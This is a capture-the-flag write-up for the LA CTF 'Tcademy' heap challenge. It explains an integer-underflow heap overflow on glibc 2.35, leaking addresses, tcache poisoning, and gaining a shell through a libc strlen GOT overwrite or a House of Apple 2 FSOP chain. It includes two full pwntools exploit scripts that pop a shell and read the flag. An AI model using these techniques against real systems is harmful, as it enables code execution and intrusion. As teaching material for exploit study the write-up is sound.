---
title: "Tcademy"
summary: "Heap exploitation on glibc 2.35: integer underflow to massive heap overflow, and two paths to shell: libc GOT overwrite or House of Apple 2 FSOP."
date: 2026-02-08
releaseDate: "2026-02-09"
topics: ["pwn"]
ctfs: ["lactf-26"]
tags: ["heap", "tcache-poisoning", "safe-linking", "house-of-apple-2", "fsop", "glibc-2.35", "libc-got"]
difficulty: hard
draft: false
---

> I'm telling you, tcache poisoning doesn't just happen due to double-frees!

```sh
nc chall.lac.tf 31144
```

---

The challenge is a classic heap note manager (create, delete, read) with only 2 note slots and a maximum allocation size of 0xf8. The vulnerability is an integer underflow in the size calculation that gives us a massive heap overflow. We'll cover two approaches to get a shell from there: the intended solution overwrites `strlen`'s GOT entry inside libc itself, and the alternative uses a House of Apple 2 FSOP chain. Both leak heap and libc addresses via the overflow primitive.

---

## The vulnerability

Here's the function that reads data into a note. Pay attention to the developer's comment:

```c
int read_data_into_note(int index, char *note, unsigned short size) {
    // I prevented all off-by-one's by forcing the size to be at least 7
    // less than what was declared by the user! I am so smart
    unsigned short resized_size = size == 8
        ? (unsigned short)(size - 7)
        : (unsigned short)(size - 8);
    int bytes = read(0, note, resized_size);
    if (bytes < 0) {
        puts("Read error");
        exit(1);
    }
    if (note[bytes-1] == '\n') note[bytes-1] = '\x00';
}
```

The developer was so focused on preventing off-by-one errors that they missed something much worse. The special case for `size == 8` makes `resized_size = 1`, and all other sizes get 8 subtracted. Sounds safe, right?

Here's how the note gets created:

```c
void create_note() {
    int index = get_note_index();
    unsigned short size;
    // ...
    scanf("%hu", &size);
    if (size < 0 || size > 0xf8) {
        puts("Invalid size!!!");
        exit(1);
    }
    notes[index] = malloc(size);
    printf("Data: ");
    read_data_into_note(index, notes[index], size);
}
```

The size check allows `size = 0`. And when `size = 0`:

- `size == 8` is false, so we take the else branch
- `resized_size = (unsigned short)(0 - 8) = 65528`

The subtraction wraps around because `unsigned short` can't go negative, it wraps to 65528 (0xfff8). Meanwhile, `malloc(0)` returns the smallest possible chunk (0x20 bytes). So `read()` will happily write 65528 bytes into a 0x20-byte allocation. The developer prevented the off-by-one and introduced a 65KB heap overflow instead.

---

## Background: glibc heap internals

If you're already comfortable with glibc malloc, tcache, safe-linking, and bin mechanics, [skip ahead to the exploit strategy](#exploit-strategy).

### Chunks

Every `malloc()` allocation lives inside a "chunk." A chunk has a header followed by user data:

```
           chunk pointer
           |
           v
           +----------+----------+
           | prev_size|   size   |   <- header (16 bytes)
           +----------+----------+
           |                     |
           |     user data       |   <- what malloc() returns a pointer to
           |                     |
           +---------------------+
```

The `size` field includes metadata flags in the low 3 bits. The most important flag is bit 0 (`PREV_INUSE`), which indicates whether the previous chunk is allocated. When a chunk is freed, its user data area gets repurposed to store linked-list pointers (`fd` and `bk`).

`malloc(0)` returns a 0x20-size chunk (the minimum). `malloc(0xf8)` returns a 0x100-size chunk. The size always includes the 0x10 header and is rounded up to the nearest 0x10.

### Tcache

Tcache (thread-local cache) is the first place glibc looks when allocating or freeing small chunks. Each thread has bins for sizes 0x20, 0x30, ..., 0x410, each holding up to 7 chunks.

When you free a chunk that fits in tcache:
1. The chunk goes onto the front of the tcache bin (LIFO stack)
2. The first 8 bytes of user data become the `fd` pointer (next entry in the bin)

When you malloc a chunk that has a matching tcache entry:
1. Pop the first entry from the tcache bin
2. Return it immediately (no coalescing, no checks in older glibc)

### Safe-linking (glibc 2.32+)

Here's the catch for modern exploitation. Since glibc 2.32, tcache (and fastbin) `fd` pointers are **mangled**:

```c
#define PROTECT_PTR(pos, ptr)  ((size_t)(pos) >> 12) ^ (size_t)(ptr)
#define REVEAL_PTR(pos, ptr)   PROTECT_PTR(pos, ptr)  // same operation (XOR is self-inverse)
```

When a chunk is freed into tcache, instead of storing `fd = next_chunk`, glibc stores:

```
fd = (address_of_fd_field >> 12) XOR next_chunk_address
```

To poison the tcache, we need to know `address_of_fd_field >> 12`, which means we need a heap leak first.

For the very first chunk in an empty tcache bin, `next_chunk_address = NULL`, so:

```
fd = (address_of_fd_field >> 12) XOR 0 = address_of_fd_field >> 12
```

This gives us a heap leak for free: if we can read the `fd` of a singly-freed tcache chunk, we get `heap_addr >> 12`.

### Unsorted bin, large bins, and small bins

When a chunk is too large for tcache (> 0x410) or tcache is full, it goes to the **unsorted bin**: a doubly-linked list hanging off `main_arena` in libc.

When malloc needs a chunk and tcache is empty, it searches the unsorted bin. Chunks that don't match get **sorted** into size-appropriate bins:

- **Small bins**: for sizes < 0x400 (exact-size bins, like tcache but doubly-linked)
- **Large bins**: for sizes >= 0x400 (range-based, sorted by size)

The key insight for leaking libc: when a chunk is alone in a bin, its `fd` and `bk` pointers point back to the bin header inside `main_arena`, which lives at a known offset from the libc base.

### libc's internal GOT

Just like the main binary, `libc.so.6` itself has a GOT (Global Offset Table) for resolving function calls. With **Partial RELRO** (common on Ubuntu), some GOT entries are writable at runtime, specifically the IRELATIVE slots used for ifunc resolvers (like `strlen`, `memcpy`, etc.).

This matters because `puts()` internally calls `strlen()` to determine the string length. If we can overwrite `strlen`'s GOT entry inside libc with `system`, then `puts(str)` becomes `system(str)`. On glibc 2.35 (Ubuntu 22.04), the writable ifunc GOT entries for `strncpy` and `strlen` sit at `libc + 0x21a090` and `libc + 0x21a098` respectively, just above the RELRO boundary.

---

## Exploit strategy

Both approaches share the same setup:

1. **Forge a fake 0x200 chunk** using the heap overflow, iteratively filling tcache and pushing one into the unsorted bin
2. **Leak libc** by overflowing non-null padding up to the unsorted bin `fd` pointer, then reading through it with `puts()`
3. **Leak the heap** the same way: overflow padding reaches a tcache chunk's mangled `fd`

Then the approaches diverge:

- **Approach 1 (intended)**: Poison tcache → overwrite `strlen` GOT in libc with `system` → `puts("/bin/sh")` triggers `system("/bin/sh")`
- **Approach 2 (alternative)**: Poison tcache → overwrite `_IO_list_all` → trigger House of Apple 2 FSOP via `exit()`

---

## Phase 1: Iterative tcache fill → unsorted bin

We need a freed chunk in the unsorted bin to get a libc leak. Chunks only go to the unsorted bin when they're too large for tcache (> 0x410) or when the tcache bin is full (7 entries). Since our max allocation is 0xf8, we can't allocate a large chunk directly, but we can **forge** one with the overflow.

The approach: in a loop, create two 0x20 chunks (note0 and note1), overflow from note0 to rewrite note1's size field to 0x201, then free note1. Glibc sees a 0x200-size chunk and puts it in `tcache[0x200]`. After 7 iterations, the tcache bin is full. On the 8th iteration, the freed chunk goes to the **unsorted bin**.

```python
for i in range(8):
    create(io, 0, 0xc, b'X')    # note0: 0x20 chunk
    create(io, 1, 0xc, b'X')    # note1: 0x20 chunk
    delete(io, 0)                # free note0 -> tcache[0x20]

    # Overflow from note0 to forge note1's size as 0x201
    overflow = b'A' * (0x10 + i * 0x20)  # padding grows each iteration
    overflow += p64(0x20) + p64(0x201)   # forged prev_size + size
    overflow += b'A' * 0x18              # chunk body padding
    overflow += p64(0x20d31 - i * 0x20)  # preserve top chunk size

    if i == 7:  # last iteration: unsorted bin needs fence chunks
        overflow += b'A' * 0x1d8
        overflow += p64(0x21)    # PREV_INUSE fence (required for unsorted bin)
        overflow += b'A' * 0x18
        overflow += p64(0x21)    # prevent forward consolidation

    create(io, 0, 4, overflow)   # size=4 -> resized to 65532, overflow!
    delete(io, 1)                # free forged 0x200 chunk
    delete(io, 0)
```

The padding grows by 0x20 each iteration because each pass "leaks" a 0x20 chunk (note1's original 0x20 chunk becomes a 0x200 entry in tcache, and the next note1 is allocated further from the top). The top chunk size is adjusted accordingly.

The fence chunks on the last iteration are important: tcache has very lax checks (no PREV_INUSE validation), but the unsorted bin **does** verify that the next chunk's `PREV_INUSE` bit is set. Without the fences, `free()` would abort.

---

## Phase 2: Libc leak

After the loop, the unsorted bin contains a chunk with `fd` and `bk` pointing to `main_arena + 0x60` (the unsorted bin list head in libc). We need to read this pointer.

The trick: overflow from note0 with a long padding of `'A'` bytes that bridges the gap between note0 and the unsorted bin chunk's data area. When we call `puts(notes[0])`, it prints the `'A'` padding and **continues past it** into the unsorted bin `fd` pointer, until it hits a null byte.

```python
create(io, 0, 4, b'A' * 0x100)  # overflow: 0x100 'A's reach the fd
data = show(io, 0)               # puts() prints: 'A'*0x100 + fd bytes
libc.address = u64(data[0x100:].ljust(8, b'\x00')) - 0x21ace0
```

Since libc addresses look like `0x7f??????????` in little endian, `puts()` prints 6 non-null bytes before hitting the null high bytes, enough to recover the full address.

---

## Phase 3: Heap leak

For tcache poisoning, we need to know `heap_addr >> 12` to compute the safe-linking mangled pointer. We leak this the same way: free a chunk into tcache (its `fd = PROTECT_PTR(pos, NULL) = pos >> 12`), then overflow padding + `puts()` to read the mangled `fd`.

```python
# Fix up the corrupted unsorted bin chunk header first (another overflow)
delete(io, 0)
create(io, 0, 4, b'A' * 0xf8 + p64(0x21) + p64(libc_unsorted) * 2 +
                  p64(0x20) + p64(0x20c50))

# Set up a tcache[0x20] entry for the leak
create(io, 1, 0xc, b'X')
delete(io, 1)    # tcache[0x20]: note1 (fd = &fd >> 12)
delete(io, 0)    # tcache[0x20]: note0 -> note1

# Overflow + read: padding reaches note1's mangled fd
create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
mangler = u64(data[0x100:].ljust(8, b'\x00'))
```

The mangler value has the form `0x00000000055xxxxx`: the low 4-5 bytes are non-null, which `puts()` prints. The high bytes are zero, but `ljust(8, b'\x00')` fills those in. This gives us the exact value we need for `PROTECT_PTR`.

---

## Phase 4: Tcache poisoning

Now we have both heap and libc addresses. We need to make `malloc()` return a pointer to `_IO_list_all` in libc. The technique: **tcache poisoning**.

The idea:
1. Free two 0x30-size chunks into the tcache: `chunk_A -> chunk_B -> NULL`
2. Overwrite `chunk_A`'s `fd` with a mangled pointer to `_IO_list_all`
3. First `malloc(0x19)` returns `chunk_A`
4. Second `malloc(0x19)` follows the poisoned `fd` and returns `_IO_list_all`

The safe-linked `fd` we need to write:

```python
mangled_target = mangler ^ io_list_all
```

Where `mangler` is the `heap_addr >> 12` value we recovered from the heap leak (Phase 3).

We use a second overflow (same `size=0` trick) to write this poisoned `fd` into the freed tcache chunks. The overflow payload also contains our **fake FILE struct** for the FSOP chain, placed at a known heap offset. Pwntools' `flat()` is very useful here: instead of slicing into a bytearray at magic offsets, we describe the payload as `{offset: data}`:

```python
o2 = flat({
    0xb0: p64(mangled_target),   # poisoned fd -> _IO_list_all
    0x160: bytes(fp),            # fake FILE struct
    0x248: wide_data,            # fake _wide_data
    0x330: wide_vtable,          # fake wide vtable
    # ...
}, filler=b'\x00', length=0x400)
```

---

## Phase 5: House of Apple 2 FSOP

This is the culmination: we've written `fake_file_addr` to `_IO_list_all`. When the program calls `exit(0)`, glibc runs `_IO_flush_all_lockp()`, which walks the linked list starting at `_IO_list_all` and "flushes" each FILE struct.

### The call chain in glibc source

When `exit(0)` is called, glibc runs `_IO_flush_all_lockp()`, which walks `_IO_list_all` and calls each FILE's vtable `overflow` function. Since we set the vtable to `_IO_wfile_jumps`, the first function called is `_IO_wfile_overflow`. Here's the real glibc 2.35 source (`libio/wfileops.c`):

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) { /* ... error ... */ }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      if (f->_wide_data->_IO_write_base == 0)
        {
          _IO_wdoallocbuf (f);   // <-- we reach here
          // ...
```

**Constraint**: `_flags` must not have `_IO_NO_WRITES` (0x8) or `_IO_CURRENTLY_PUTTING` (0x800), and `_wide_data->_IO_write_base` must be NULL. Our `" sh\x00"` flags value (0x00006873) satisfies all of these.

Next, `_IO_wdoallocbuf` (`libio/wgenops.c`):

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;                          // must be NULL to continue
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)  // <-- dispatches through wide vtable
      return;
  // ...
```

**Constraint**: `_wide_data->_IO_buf_base` must be NULL and `_flags` must not have `_IO_UNBUFFERED` (0x2).

Finally, `_IO_WDOALLOCATE` is a macro (`libio/libioP.h`) that dispatches through the **wide vtable**:

```c
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
// expands to:
// (FP->_wide_data->_wide_vtable->__doallocate)(FP)
```

The `FP` pointer is passed as the first argument. Since `_flags` is at offset 0 of the FILE struct and we set it to `" sh\x00"`, the call becomes `system(" sh")`.

The full chain:

```
exit()
  → _IO_flush_all_lockp()
    → _IO_wfile_overflow(fp, EOF)           vtable->overflow
      → _IO_wdoallocbuf(fp)                _wide_data->_IO_write_base == NULL
        → _IO_WDOALLOCATE(fp)              _wide_data->_IO_buf_base == NULL
          → fp->_wide_data->_wide_vtable->__doallocate(fp)
            → system(" sh")                offset 0x68 in our fake wide vtable
```

### Building the fake FILE

A `_IO_FILE` struct is large (~0xe8 bytes) with many fields. We only need to set a few to steer execution. Pwntools provides `FileStructure` for constructing these with named fields instead of raw byte offsets:

```python
fake_file_addr = heap_base + 0x400  # known location on heap

fp = FileStructure()
fp.flags = u64(b' sh\x00\x00\x00\x00\x00')  # doubles as system() argument!
fp._IO_buf_base = 0                            # triggers _IO_wdoallocbuf
fp._lock = fake_file_addr + 0xe0               # must point to writable NULL
fp._wide_data = fake_file_addr + 0xe8          # -> our fake wide data struct
fp.vtable = io_wfile_jumps                     # _IO_wfile_jumps (legitimate vtable)

# _mode is at offset 0xc0, inside FileStructure's "unknown2" region
mode_data = bytearray(48)
mode_data[0x18:0x1c] = p32(1)  # _mode = 1 (enables wide code path)
fp.unknown2 = bytes(mode_data)
```

The `_flags` field is at offset 0 of the FILE struct. When `system()` is called, its argument is a pointer to the FILE struct itself, so the first bytes of `_flags` become the command string. We set it to `" sh\x00"` (space + sh), which `system()` interprets as running `/bin/sh`.

### The wide data and wide vtable

The `_wide_data` struct and its vtable don't have pwntools helpers, but we can use `flat()` to place data at named offsets rather than slicing bytearrays:

```python
# Fake _wide_data (pointed to by fp._wide_data)
wide_data = flat({
    0x18: p64(0),    # _IO_write_base = 0
    0x20: p64(1),    # _IO_write_ptr = 1 (must be > write_base)
    0x30: p64(0),    # _IO_buf_base = 0
    0xe0: p64(wide_vtable_addr),  # _wide_vtable -> our fake vtable
}, filler=b'\x00', length=0xe8)

# Fake wide vtable
wide_vtable = flat({
    0x68: p64(system_addr),  # __doallocate offset
}, filler=b'\x00', length=0x70)
```

The chain: `_IO_wfile_overflow` sees `write_ptr > write_base`, checks `_IO_buf_base == NULL`, calls `_IO_wdoallocbuf`, which calls `_IO_WDOALLOCATE`. This dereferences `_wide_vtable->__doallocate` (offset 0x68), which we've pointed to `system`.

### Why House of Apple 2 works on glibc 2.35

In glibc 2.35, the *main* vtable pointer (`_IO_file_jumps`, at offset 0xd8) is validated by `IO_validate_vtable()`. It must point within the legitimate vtable section. **But the wide vtable is NOT validated.** This is the key insight of House of Apple 2: use `_IO_wfile_jumps` (a legitimate vtable) to reach the wide code path, then hijack the unchecked wide vtable.

---

## The `read()` padding trap

A subtle bug in the batched exploit: when we write `p64(fake_file_addr)` as the data for the last `create_note()`, the data is only 8 bytes. But `read()` wants to read up to 17 bytes (since `resized_size = 25 - 8 = 17`). If we send the exit command (`4\n`) right after, `read()` consumes it as part of the note data, and the program never exits!

The fix: pad the data to exactly 17 bytes so `read()` is fully satisfied:

```python
ffa_padded = p64(fake_file_addr).ljust(0x11, b'\x00')
io.send(
    b'1\n1\n25\n' + ffa_padded +  # read() gets exactly 17 bytes
    b'4\n'                          # exit command is separate
)
```

Without this padding, the exploit works only when TCP timing happens to deliver the packets separately, turning a reliable exploit into a random coin flip.

---

## Verifying the shell with `echo`

After triggering the FSOP chain, we need a reliable way to confirm we actually got a shell. The trick: immediately send `echo PWNED` and check for the response. If `system(" sh")` worked, the shell executes our echo. If it crashed, we get an EOF:

```python
io.sendline(b'4')          # trigger exit -> FSOP
io.sendline(b'echo PWNED') # shell test
io.recvuntil(b'PWNED', timeout=3)  # success! we have a shell
io.sendline(b'cat /app/flag.txt')  # grab the flag
```

This is more reliable than going interactive immediately and hoping the connection stays alive.

---

## Alternative: libc GOT overwrite (intended solution)

The intended solution skips FSOP entirely. Instead of building fake FILE structs and triggering `exit()`, it overwrites `strlen`'s GOT entry inside libc with `system`. This works because `puts()` internally calls `strlen()` to determine the string length.

After obtaining the same libc and heap leaks (phases 1-3), the endgame is:

```python
# Tcache poison targeting strlen's ifunc GOT slot in libc
strlen_got = libc.address + 0x21a090
poisoned_fd = mangler ^ strlen_got
```

Same tcache poisoning setup as the FSOP approach (two 0x30 entries, overflow to corrupt `fd`), but instead of pointing at `_IO_list_all`, we point at libc's internal GOT. The two qwords at `libc + 0x21a090` are the resolved ifunc entries for `strncpy` and `strlen`:

```python
create(io, 1, 0x20, b'/bin/sh\x00')   # consumes first tcache entry, note1 = "/bin/sh"
delete(io, 0)
create(io, 0, 0x20,
    p64(libc.address + 0xa88d0) +      # preserve strncpy's resolved address
    p64(libc.sym.system)               # overwrite strlen -> system
)
```

Now `strlen` points to `system`. The trigger:

```python
show(io, 1)  # puts("/bin/sh") -> strlen("/bin/sh") -> system("/bin/sh")
```

That's it. No fake FILE structs, no wide vtables, no exit trigger. Just a single function pointer swap. This works because libc.so.6 on Ubuntu 22.04 (glibc 2.35) has Partial RELRO, leaving the ifunc GOT entries writable at `libc + 0x21a090` and `libc + 0x21a098`, just above the read-only RELRO boundary.

---

## Solve scripts

<details>
<summary>House of Apple 2 FSOP</summary>

```python
from pwn import *

context.arch = 'amd64'
exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def create(io, idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def delete(io, idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def show(io, idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    return io.recvline(keepends=False)

IO_WFILE_JUMPS_OFF = 0x2170c0

io = remote('chall.lac.tf', 31144) if args.REMOTE else process([exe.path])

# ── Phase 1: Fill tcache[0x200] + push one to unsorted bin ──

for i in range(8):
    create(io, 0, 0xc, b'X')
    create(io, 1, 0xc, b'X')
    delete(io, 0)

    overflow = b'A' * (0x10 + i * 0x20)
    overflow += p64(0x20) + p64(0x201)
    overflow += b'A' * 0x18
    overflow += p64(0x20d31 - i * 0x20)

    if i == 7:
        overflow += b'A' * 0x1d8
        overflow += p64(0x21) + b'A' * 0x18 + p64(0x21)

    create(io, 0, 4, overflow)
    delete(io, 1)
    delete(io, 0)

# ── Phase 2: Libc leak ──

create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
libc.address = u64(data[0x100:].ljust(8, b'\x00')) - 0x21ace0
log.info(f'{hex(libc.address)=}')

# ── Phase 3: Heap leak ──

delete(io, 0)
create(io, 0, 4,
    b'A' * 0xf8 + p64(0x21) +
    p64(libc.address + 0x21ace0) * 2 +
    p64(0x20) + p64(0x20c50))

create(io, 1, 0xc, b'X')
delete(io, 1)
delete(io, 0)
create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
mangler = u64(data[0x100:].ljust(8, b'\x00'))
log.info(f'{hex(mangler)=}')

delete(io, 0)
create(io, 0, 4, b'A' * 0xf8 + p64(0x21))

# ── Phase 4: Tcache poisoning → _IO_list_all + fake FILE ──

heap_base = mangler << 12
io_list_all = libc.sym['_IO_list_all']
io_wfile_jumps = libc.address + IO_WFILE_JUMPS_OFF

# Set up two 0x30 tcache entries for poisoning
delete(io, 0)
create(io, 0, 0x20, b'X' * 0x18)  # 0x30 chunk from top (heap+0x3B0)
create(io, 1, 0x20, b'Y' * 0x18)  # 0x30 chunk from top (heap+0x3E0)
delete(io, 1)  # tcache[0x30]: heap+0x3E0
delete(io, 0)  # tcache[0x30]: heap+0x3B0 → heap+0x3E0

# Build fake FILE struct
fake_file_addr = heap_base + 0x420
wide_data_addr = fake_file_addr + 0xe8
wide_vtable_addr = wide_data_addr + 0xe8

fp = FileStructure()
fp.flags = u64(b' sh\x00\x00\x00\x00\x00')
fp._IO_buf_base = 0
fp._lock = fake_file_addr + 0xe0
fp._wide_data = wide_data_addr
fp.vtable = io_wfile_jumps
mode_bytes = bytearray(48)
mode_bytes[0x18:0x1c] = p32(1)
fp.unknown2 = bytes(mode_bytes)

wide_data = flat({
    0x18: p64(0), 0x20: p64(1), 0x30: p64(0),
    0xe0: p64(wide_vtable_addr),
}, filler=b'\x00', length=0xe8)

wide_vtable = flat({
    0x68: p64(libc.sym.system),
}, filler=b'\x00', length=0x70)

# Overflow: poison tcache + embed fake FILE structs
# note0's 0x30 chunk is at heap+0x3B0, note1's at heap+0x3E0
o2 = flat({
    0x110: p64(0) + p64(0x31),                                 # note0 chunk header
    0x120: p64(mangle(io_list_all, heap_base + 0x3C0)),         # poisoned fd
    0x140: p64(0) + p64(0x31),                                  # note1 chunk header
    0x150: p64(mangle(0, heap_base + 0x3F0)),                   # fd → NULL
    0x180: bytes(fp),                                            # fake FILE at heap+0x420
    0x268: wide_data,                                            # fake _wide_data
    0x350: wide_vtable,                                          # fake wide vtable
}, filler=b'\x00', length=0x3C0)

create(io, 0, 4, o2)

# ── Phase 5: Trigger FSOP ──

delete(io, 0)
create(io, 0, 0x20, b'Z' * 0x18)  # consume first tcache[0x30] entry

# Second malloc returns _IO_list_all, write fake_file_addr
# Pad to 0x18 bytes so read() doesn't consume the exit command
create(io, 1, 0x20, p64(fake_file_addr).ljust(0x18, b'\x00'))

# exit() → _IO_flush_all → FSOP → system(" sh")
io.sendlineafter(b'> ', b'4')
io.sendline(b'echo PWNED')
io.recvuntil(b'PWNED', timeout=3)
log.success('Got shell!')
io.sendline(b'cat /app/flag.txt')
io.interactive()
```

</details>

### libc GOT overwrite (intended)

The intended solution, much shorter since there's no FILE struct construction:

```python
from pwn import *

context.arch = 'amd64'
exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def create(io, idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def delete(io, idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def show(io, idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    return io.recvline(keepends=False)

io = remote('chall.lac.tf', 31144) if args.REMOTE else process([exe.path])

# ── Phase 1: Fill tcache[0x200] + push one to unsorted bin ──

for i in range(8):
    create(io, 0, 0xc, b'X')
    create(io, 1, 0xc, b'X')
    delete(io, 0)

    overflow = b'A' * (0x10 + i * 0x20)
    overflow += p64(0x20) + p64(0x201)
    overflow += b'A' * 0x18
    overflow += p64(0x20d31 - i * 0x20)

    if i == 7:
        overflow += b'A' * 0x1d8
        overflow += p64(0x21) + b'A' * 0x18 + p64(0x21)

    create(io, 0, 4, overflow)
    delete(io, 1)
    delete(io, 0)

# ── Phase 2: Libc leak ──

create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
libc.address = u64(data[0x100:].ljust(8, b'\x00')) - 0x21ace0
log.info(f'{hex(libc.address)=}')

# ── Phase 3: Heap leak ──

delete(io, 0)
create(io, 0, 4,
    b'A' * 0xf8 + p64(0x21) +
    p64(libc.address + 0x21ace0) * 2 +
    p64(0x20) + p64(0x20c50))

create(io, 1, 0xc, b'X')
delete(io, 1)
delete(io, 0)
create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
mangler = u64(data[0x100:].ljust(8, b'\x00'))
log.info(f'{hex(mangler)=}')

# Fix freed chunk header
delete(io, 0)
create(io, 0, 4, b'A' * 0xf8 + p64(0x21))

# ── Phase 4: Tcache poisoning → strlen GOT ──

delete(io, 0)
create(io, 0, 0x20, b'X' * 0x18)
create(io, 1, 0x20, b'Y' * 0x18)
delete(io, 1)
delete(io, 0)

# Overflow: poison tcache fd to point at libc's strlen GOT
strlen_got = libc.address + 0x21a090
create(io, 0, 4,
    b'A' * 0x118 +
    p64(0x31) +
    p64(mangle(strlen_got, mangler << 12)) +
    b'\x00')  # null byte to pass tcache key check

# Consume poisoned tcache
create(io, 1, 0x20, b'/bin/sh\x00')  # first pop: normal chunk
delete(io, 0)
create(io, 0, 0x20,                   # second pop: libc GOT!
    p64(libc.address + 0xa88d0) +      # preserve strncpy
    p64(libc.sym.system))              # overwrite strlen -> system

# ── Trigger: puts("/bin/sh") → strlen → system ──
show(io, 1)
io.interactive()
```

---

## Flag

```
lactf{omg_arb_overflow_is_so_powerful}
```
